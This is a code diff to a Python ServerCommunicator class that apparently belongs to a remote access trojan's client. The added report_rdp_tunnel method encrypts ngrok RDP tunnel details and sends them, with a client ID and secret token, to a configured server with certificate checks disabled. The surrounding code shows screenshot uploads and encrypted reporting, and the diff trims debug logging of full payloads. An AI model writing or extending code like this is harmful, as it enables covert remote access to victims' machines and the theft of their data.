@@ -29,7 +29,7 @@ class ServerCommunicator:
         self.server_url = Config.SERVER_URL
         self.token = Config.SECRET_TOKEN
 
-    def _send_request(self, endpoint, data=None, files=None):
+    def _send_request(self, endpoint: str, data=None, files=None):
         try:
             endpoint = endpoint.lstrip('?/')
             base_url = self.server_url.rstrip('/')
@@ -49,6 +49,46 @@ class ServerCommunicator:
             if Config.DEBUG_MODE:
                 logging.error(f"Connection error: {str(e)}")
             raise CommunicationError(f"Connection error: {str(e)}")
+
+    def report_rdp_tunnel(self, tunnel_info: Dict) -> Dict:
+        """Report ngrok tunnel information to the server."""
+        try:
+            if Config.DEBUG_MODE:
+                logging.info(f"Preparing RDP tunnel report: client_id={self.client_id}")
+
+            tunnel_info_json = json.dumps(tunnel_info, ensure_ascii=False)
+            encrypted_tunnel_info = self.encryption.encrypt(tunnel_info_json)
+
+            encrypted_data = {
+                "action": "report_rdp_tunnel",
+                "client_id": self.client_id,
+                "token": self.token,
+                "tunnel_info": encrypted_tunnel_info
+            }
+
+            if Config.DEBUG_MODE:
+                logging.info(f"Sending RDP tunnel report: {encrypted_data}")
+
+            response = requests.post(
+                self.server_url,
+                data=encrypted_data,
+                timeout=Config.COMMAND_TIMEOUT,
+                verify=False
+            )
+
+            if response.status_code != 200:
+                if Config.DEBUG_MODE:
+                    logging.error(f"RDP tunnel report failed: status={response.status_code}, response={response.text}")
+                raise CommunicationError(f"RDP tunnel report failed: {response.text}")
+
+            if Config.DEBUG_MODE:
+                logging.info("RDP tunnel report sent successfully")
+            return response.json()
+
+        except Exception as e:
+            if Config.DEBUG_MODE:
+                logging.error(f"RDP tunnel report error: {str(e)}")
+            raise CommunicationError(f"RDP tunnel report error: {str(e)}")
 
     def report_update(self, new_version: str) -> Dict:
         """
@@ -250,9 +290,6 @@ class ServerCommunicator:
                 if Config.DEBUG_MODE:
                     logging.info("Including screenshot in upload")
 
-            if Config.DEBUG_MODE:
-                logging.info(f"Sending upload_data: {encrypted_data}, files: {files is not None}")
-
             response = requests.post(
                 self.server_url,
                 data=encrypted_data,
@@ -343,7 +380,7 @@ class ServerCommunicator:
             )
             response.raise_for_status()
             if Config.DEBUG_MODE:
-                logging.info(f"Received response: status={response.status_code}, text={response.text}")
+                logging.info(f"Received response: {response.status_code}")
             return response.json()
         except Exception as e:
             if Config.DEBUG_MODE:
